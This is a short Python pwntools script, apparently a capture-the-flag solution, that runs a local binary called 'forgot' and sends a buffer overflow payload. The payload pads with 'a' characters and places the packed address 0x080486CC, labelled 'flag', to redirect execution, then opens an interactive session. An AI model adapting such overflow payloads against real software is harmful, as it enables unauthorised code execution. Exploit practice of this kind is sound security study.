from pwn import *

flag=0x080486CC

Debug=1
if Debug:
    io=process('./forgot')
else:
    pass

eax=0x1
ret=0xBF9CA5F0

def main():
    io.recv()
    io.sendline()
    io.recv()
    io.sendline(('a'*0x24+p32(flag)).ljust(0x68,'a')+p32(2))
    io.interactive()

pause()
main()